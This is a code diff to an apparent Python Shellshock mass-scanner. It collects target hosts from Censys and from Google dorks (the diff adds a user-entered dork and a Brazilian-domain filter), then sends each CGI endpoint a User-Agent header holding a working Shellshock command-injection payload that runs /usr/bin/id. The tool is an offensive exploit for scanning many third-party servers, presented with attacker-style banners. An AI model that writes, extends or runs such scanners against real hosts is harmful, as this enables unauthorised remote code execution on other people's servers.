@@ -4,7 +4,6 @@
 from termcolor import cprint
 import json, requests, os
 
-c = 0
 API_URL = "https://www.censys.io/api/v1"
 UID = ""
 SECRET = ""
@@ -13,13 +12,19 @@ pages = float('inf')
 page = 1
 
 def single():
-    url = raw_input('Input the URL to test: ')
+    url = raw_input('[+] - Input the URL to test: ')
     test_conn(url)
 
 def search_google():
+    dork = raw_input('[+] - Please input the dork: ')
     from google import search
-    for url in search('+filetype:cgi'):
+    for url in search(dork,tld='com.br',ip='69.175.71.171',conn_type='http'):
         test_conn(url)
+    print
+    cprint('[+] - GAME OVER - [+]','red','on_yellow')
+    cprint('[+] - PRESS ANY KEY - [+]','red','on_yellow')
+    raw_input()
+    menu()
 
 def search(API_URL,UID,SECRET,page,pages):
     while page <= pages:
@@ -32,12 +37,9 @@ def search(API_URL,UID,SECRET,page,pages):
         page += 1
 
 def build_url(res_json):
-    c= 0
     for info in res_json['results']:
         full_url = 'http://'+info['ip']+'/cgi-bin/test.cgi'
         test_conn(full_url)
-        c += 1
-    print c
 
 def test_conn(url):
     user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}
@@ -71,6 +73,7 @@ def test_vuln(status_code,host_connection,url):
 
 def check_conf():
     if UID == '' or SECRET == '':
+        clear()
         cprint('''
 ███████╗██████╗ ██████╗  ██████╗
 ██╔════╝██╔══██╗██╔══██╗██╔═══██╗
@@ -130,11 +133,14 @@ incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is
 still present after the incorrect fix.
     ''','red')
 
-def menu():
+def clear():
     try:
         os.system('clear')
     except:
         os.system('cls')
+
+def menu():
+    clear()
     banner()
     cprint('''
   ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   ███    █▄
